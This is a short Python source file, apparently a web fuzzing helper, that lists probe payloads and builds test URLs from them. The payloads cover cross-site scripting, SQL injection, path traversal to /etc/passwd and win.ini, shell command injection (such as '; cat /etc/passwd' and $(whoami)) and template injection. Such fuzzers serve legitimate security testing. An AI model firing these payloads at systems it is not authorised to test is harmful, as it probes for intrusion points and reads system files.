import urllib.parse
from typing import Any, Union

FUZZ_PAYLOADS = [
    "<script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "\" onmouseover=alert(1)",
    "' OR 1=1--",
    "1' ORDER BY 1--+",
    "1 UNION SELECT null--",
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    "; cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "{{7*7}}",
    "${7*7}",
    "%00",
    "NaN",
    "9999999999",
]

def generate_fuzz_urls(base_url: str, params: Union[dict[str, Any], list[str], None] = None) -> list[str]:
    fuzzed_urls = []
    base = base_url.rstrip("/")
    if isinstance(params, dict):
        for key in params.keys():
            for payload in FUZZ_PAYLOADS:
                test_params = dict(params)
                test_params[key] = payload
                query = urllib.parse.urlencode(test_params)
                fuzzed_urls.append(f"{base}?{query}")
    elif isinstance(params, list):
        for p in params:
            fuzzed_urls.append(f"{base}/{p}")
    else:
        for payload in FUZZ_PAYLOADS:
            fuzzed_urls.append(f"{base}?q={urllib.parse.quote(payload)}")
    return fuzzed_urls

